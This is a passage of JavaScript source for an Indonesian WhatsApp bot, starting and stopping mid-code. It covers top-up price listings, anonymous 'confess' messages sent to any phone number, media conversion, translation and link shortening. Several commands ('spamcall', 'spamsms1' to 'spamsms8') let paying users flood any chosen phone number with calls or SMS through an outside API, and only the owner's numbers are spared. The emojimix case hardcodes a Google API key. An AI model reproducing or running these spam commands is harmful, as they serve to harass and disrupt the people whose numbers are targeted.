if (x.code.startsWith("ITF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Indosat*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_three':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("TTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Three*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_xl':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("XLTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa XL*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_axis':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("AXTF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Axis*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break

// SALDO EMONEY
case 'list_saldo_ovo':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("OVO")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo OVO*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_saldo_dana':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("DANA")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo DANA*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_saldo_linkaja':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("LINKAJA")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo LinkAja*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_saldo_shoope':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("SHP")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo Shoope Pay*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_saldo_gopay':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("GOPAY")) {
listaov.push(x)
}
}
var teks = `*List Harga Saldo GOPAY*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break

// TOKEN LISTRIK
case 'list_token_pln':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("PLN")) {
listaov.push(x)
}
}
var teks = `*List Harga Token Listrik*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break

case 'confes': case 'confess':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
let nomor_temanh = q.split("|")[0] ? q.split("|")[0] : q
let ini_nama_kamu = q.split("|")[1] ? q.split("|")[1] : q
let pesan_temanh = q.split("|")[2] ? q.split("|")[2] : ''
let nomor_pengirimnyah = sender.split("@")[0]
if (pesan_temanh.length <1) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo`)
if (!q) return reply(`Format Fitur Confes / Kirim pesan rahasia ke seseorang lewat bot\n\n_Example_\n${prefix+command} Nomor|Pengirim|Pesan\n\n_Contoh_\n${prefix+command} 628817839722|Crush|Hello\n\n*Note :*\nBerawal Dari 628xxx Tanpa Spasi`)
ronzz.sendMessage(`${nomor_temanh}@s.whatsapp.net`, { text: `━━━[ *PESAN-RAHASIA* ]━━━\n_Hi ada confess nih buat kamu_\n\n*dari :* ${ini_nama_kamu}\n*pesan :* ${pesan_temanh}\n\n_Pesan ini di tulis oleh seseorang,_\n_bot hanya menyampaikan saja._\n━━━━━━━━━━━━━━━━`, footer: 'Klik button untuk membalas pesan', buttons: [{buttonId: `${prefix}balas_confes ${nomor_pengirimnyah}@s.whatsapp.net|${nomor_temanh}@s.whatsapp.net`, buttonText: {displayText: 'Balas✍️'}, type: 1}],headerType: 1 })
reply('Sukses mengirimkan pesan ke dia.')
}
addCmd(command, 1, db_dashboard)
break
case 'balas_confes':{
let pengirim_menh = q.split("|")[0]
let penerima_menh = q.split("|")[1]
db_menfes.push({"id": penerima_menh, "teman": pengirim_menh })
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
reply('Silahkan Masukan pesan yang ingin di balas ke dia.')
}
addCmd(command, 1, db_dashboard)
break

case 'menfes': case 'menfess':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
if (!q) return reply(`Format Fitur Menfes / Kirim pesan rahasia ke seseorang lewat bot\n\n_Example_\n${prefix+command} Nomor|Pengirim|Pesan\n\n_Contoh_\n${prefix+command} 628817839722|Bot|Hai\n\nNote : Berawal Dari 628xxx`)
let nomor_teman = q.split('|')[0] ? q.split('|')[0] : q
let nama_pengirim = q.split('|')[1] ? q.split('|')[1] : q
let pesan_teman = q.split('|')[2] ? q.split('|')[2] : ''
if (pesan_teman.length <1) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62881xxx|nama|hallo`)
let nomor_pengirimnya = sender.split("@")[0]
let text_menfess = `_Hi ada menfess nih buat kamu_\n\n*Dari :* ${nama_pengirim}\n*Pesan :* ${pesan_teman}\n\n_Pesan ini di tulis oleh seseorang,_\n_bot hanya menyampaikan saja._`
let button_menfes = [{ buttonId: `${prefix}balas_menfes ${nomor_pengirimnya}@s.whatsapp.net|${nomor_teman}@s.whatsapp.net`, buttonText: { displayText: "Balas✍️" }, type: 1 }]
const ini_mess_menfess = { image: await reSize(fs.readFileSync(menfess), 300, 200), caption: text_menfess, footer: 'Klik button untuk membalas pesan', buttons: button_menfes, headerType: 4 }
ronzz.sendMessage(`${nomor_teman}@s.whatsapp.net`, ini_mess_menfess)
reply(`Sukses Mengirimkan Pesan Menfess`)
}
addCmd(command, 1, db_dashboard)
break
case 'balas_menfes':
let pengirim_men = q.split("|")[0]
let penerima_men = q.split("|")[1]
db_menfes.push({id: penerima_men, teman: pengirim_men })
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
reply('Silahkan Masukan pesan yang ingin di balas ke dia.')
addCmd(command, 1, db_dashboard)
break

case 'report':
if (!q) return reply(`Ex : ${prefix+command} Fitur Yang Ingin Di Report\n\nContoh :\n${prefix+command} Bang Fitur Sticker Error`)
let pesan_report = q.split(' ')[0] ? q.split(' ')[0] : ''
if (pesan_report.length <1) return reply(`_*Contoh*_\n${prefix+command} bang fitur antilink error`)
let text_report =`*| REPORT FITUR |*\n`
text_report +=`Dari : ${sender.split('@')[0]}\n`
text_report +=`Pesan : ${pesan_report}`
ronzz.sendMessage(`${ownerNomer}@s.whatsapp.net`, {text: text_report}, {quoted:fkontak})
break

case 'request':
if (!q) return reply(`Ex : ${prefix+command} Fitur Yang Ingin Di Tambahkan\n\nContoh :\n${prefix+command} Bang Tambahin Fitur Game`)
let pesan_request = q.split(' ')[0] ? q.split(' ')[0] : ''
if (pesan_request.length <1) return reply(`_*Contoh*_\n${prefix+command} bang tambahin fitur jadibot`)
let text_request =`*| REQUEST FITUR |*\n`
text_request +=`Dari : ${sender.split('@')[0]}\n`
text_request +=`Pesan : ${pesan_request}`
ronzz.sendMessage(`${ownerNomer}@s.whatsapp.net`, {text: text_request}, {quoted:fkontak})
break

case 'spamcall':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam call ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/spam/call1?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break

case 'spamsms1':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms2':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break

case 'spamsms3':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms4':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms5':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms6':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms7':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break 

case 'spamsms8':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekUser("premium", sender) !== true) return reply(mess.prem)
if (!q) return reply(`Format salah ❌\n\nContoh :\n${prefix+command} 628817839722`)
if ([`${ownerNomer}`,"628817839722","16784037437"].includes(q)) return reply('Tidak boleh spam sms ke owner.')
if (![`${ownerNomer}`,"628817839722","16784037437"].includes(q)) {
var data = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${q}`)
reply(data.message)
}
}
break

case 'tourl':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isImage || isQuotedImage) {
reply(mess.wait)
let media = await downloadAndSaveMediaMessage('image', `./options/sticker/${sender}`)
let tph = await TelegraPh(media)
reply(tph)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
let media = await downloadAndSaveMediaMessage('video', `./options/sticker/${jamwit}`)
let tph = await TelegraPh(media)
reply(tph)
} else {
reply(`Kirim/reply gambar/video dengan caption *${prefix+command}*`)
}
}
addCmd(command, 1, db_dashboard)
break

case 'ttp':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (args.length < 1) return reply(`Ex : ${prefix+command} Teks\n\nContoh :\n${prefix+command} ZiahBotz`)
if (q.length > 75) return reply(`Teksnya Kepanjangan Kak ${cekUser("name", sender)}🙏`)
reply(mess.wait)
getBuffer(`https://api.xteam.xyz/ttp?file&text=${encodeURIComponent(q)}`)
.then(res => {
if (res == undefined) return reply(mess.errorApi)
ronzz.sendImageAsSticker(from, res, msg, { packname, author })
}).catch(() => reply(mess.errorApi))
}
addCmd(command, 1, db_dashboard)
break

case 'attp':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (args.length < 1) return reply(`Ex : ${prefix+command} Teks\n\nContoh :\n${prefix+command} RonzzOfc`)
if (q.length > 75) return reply(`Teksnya Kepanjangan Kak ${cekUser("name", sender)}🙏`)
reply(mess.wait)
getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
.then(res => {
if (res == undefined) return reply(mess.errorApi)
ronzz.sendImageAsSticker(from, res, msg, { packname, author })
}).catch(() => reply(mess.errorApi))
}
addCmd(command, 1, db_dashboard)
break

case 'nulis':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Yang Ingin Di Tulis\n\nContoh :\n${prefix+command} RonzzOfc`)
reply(mess.wait)
var tulisan = q
var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', ['./storage/nulis/buku/buku_sebelum.jpg','-font','./storage/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./storage/nulis/buku/buku_sesudah.jpg'])
.on('error', () => reply('error'))
.on('exit', () => {
ronzz.sendMessage(from, { image: fs.readFileSync('./storage/nulis/buku/buku_sesudah.jpg')}, {quoted: msg, caption: `Jangan Malas Kak...`})
})
}
addCmd(command, 1, db_dashboard)
break

case 'ssweb':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (args.length < 1) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://ronzxapis.my.id`)
reply(mess.wait)
let anu = `${api}/api/tools/ssweb?link=${q}&apikey=${apikey}`
if (anu.status == false) return reply('Link url tidak valid')
let teks =`*From :* ${anu.result.from}`
ronzz.sendMessage(from, { image: { url: anu.result.url }, caption: teks }, { quoted: msg })
}
break

case 'toimg': case 'toimage':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isQuotedSticker) return reply(`Reply stikernya!`)
var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'options/sticker'+getRandom('.webp')
var rand2 = 'options/sticker'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
reply(mess.wait)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.errorApi)
ronzz.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: fkontak })
fs.unlinkSync(`./${rand2}`)
})
} else {
reply(mess.wait)
webp2mp4File(`./${rand1}`).then(async(data) => {
fs.unlinkSync(`./${rand1}`)
ronzz.sendMessage(from, {caption: `*Sticker Convert To Video!*`, video: await getBuffer(data.data) }, { quoted: fkontak })
})
}
}
addCmd(command, 1, db_dashboard)
break

case 'tomp3': case 'toaudio':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isVideo || isQuotedVideo) {
let media = await ronzz.downloadAndSaveMediaMessage(msg, 'video', `./options/audio/${Date.now()}.mp4`)
reply(mess.wait)
let ran = './options/audio/'+getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) { fs.unlinkSync(ran); return reply(mess.errorApi) }
ronzz.sendMessage(from, { audio: fs.readFileSync(ran),mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
fs.unlinkSync(ran)
})
} else {
reply(`Kirim/reply video dengan caption *${prefix+command}*`)
}
}
break

case 'tovn': case 'toptt':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isVideo || isQuotedVideo) {
let media = await ronzz.downloadAndSaveMediaMessage(msg, 'video', `./options/audio/${Date.now()}.mp4`)
reply(mess.wait)
let ran = './options/audio'+getRandom('.opus')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) { fs.unlinkSync(ran); return reply(mess.errorApi) }
ronzz.sendMessage(from, { audio: fs.readFileSync(ran), mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
fs.unlinkSync(ran)
})
} else if (isQuotedAudio) {
let media = await ronzz.downloadAndSaveMediaMessage(msg, 'audio', `./options/audio/${Date.now()}.mp3`)
reply(mess.wait)
let ran = './options/audio'+getRandom('.opus')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) { fs.unlinkSync(ran); return reply(mess.errorApi) }
ronzz.sendMessage(from, { audio: fs.readFileSync(ran), mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
fs.unlinkSync(ran)
})
} else {
reply(`Kirim/reply video/audio dengan caption *${prefix+command}*`)
}
}
break

case 'obfus':
case 'obfuscator':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Kode Js Nya Mana?`)
let ini_kode_jsnya = q
let result_obfus = java_script.obfuscate(`${ini_kode_jsnya}`,
{compact: false, controlFlowFlattening: true, controlFlowFlatteningThreshold: 1, numbersToExpressions: true, simplify: true, stringArrayShuffle: true, splitStrings: true, stringArrayThreshold: 1 });
reply(result_obfus.getObfuscatedCode())
}
addCmd(command, 1, db_dashboard)
break

case 'sticker': case 's': case 'stiker':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./options/sticker/${tanggal}.jpg`)
reply(mess.wait)
ronzz.sendImageAsSticker(from, media, msg, { packname: `${packname}`, author: `${author}`})
} else if (isVideo || isQuotedVideo) {
let media = await downloadAndSaveMediaMessage('video', `./options/sticker/${tanggal}.mp4`)
reply(mess.wait)
ronzz.sendVideoAsSticker(from, media, msg, { packname: `${packname}`, author: `${author}`})
} else {
reply(`Kirim/reply gambar/vidio dengan caption *${prefix+command}*`)
}
}
addCmd(command, 1, db_dashboard)
break

case 'emojimix': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Example :\n${prefix+command} 😅+🤭`)
var mytext = body.slice(10)
let [emoji1, emoji2] = mytext.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
ronzz.sendImageAsSticker(from, res.url, msg, { packname: packname, author: author, categories: res.tags })
}
}
break

case 'translateid':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Teks Yang Ingin Di Translate\n\nContoh :\n${prefix+command} Hello my name is Ronzz YT`)
let translate_res = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/id?apikey=${lolkey}&text=${q}`)
let text_translate = "*TRANSLATE*\n"
text_translate += `*To :* ${translate_res.result.to}\n`
text_translate += `*Result :* ${translate_res.result.translated}\n`
text_translate += `*Original :* ${translate_res.result.original}\n`
text_translate += `*From :* ${translate_res.result.from}`
reply(text_translate)
}
addCmd(command, 1, db_dashboard)
break

case 'translateen':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Teks Yang Ingin Di Translate\n\nContoh :\n${prefix+command} Hello my name is Ronzz YT`)
let translate_res = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/en?apikey=${lolkey}&text=${q}`)
let text_translate = "*TRANSLATE*\n"
text_translate += `*To :* ${translate_res.result.to}\n`
text_translate += `*Result :* ${translate_res.result.translated}\n`
text_translate += `*Original :* ${translate_res.result.original}\n`
text_translate += `*From :* ${translate_res.result.from}`
reply(text_translate)
}
addCmd(command, 1, db_dashboard)
break

case 'tinyurl':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://ronzxapis.my.id`) 
var ronzz = await fetchJson(`${api}/api/shortlink/tinyurl?url=${q}&apikey=${apikey}`) 
let teksnya = "*Shorts Link Tinyurl*\n"
teksnya += `*Sebelum :* ${q}\n`
teksnya += `*Sesudah :* ${ronzz.result}`
reply(teksnya)
}
addCmd(command, 1, db_dashboard)
break

case 'cuttly':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://ronzxapis.my.id`) 
var ronzz = await fetchJson(`${api}/api/shortlink/cuttly?url=${q}&apikey=${apikey}`) 
let teksnya = "*Shorts Link Cuttly*\n"
teksnya += `*Sebelum :* ${q}\n`
teksnya += `*Sesudah :* ${ronzz.result}`
reply(teksnya)
}
addCmd(command, 1, db_dashboard)
break

case 'bitly':{
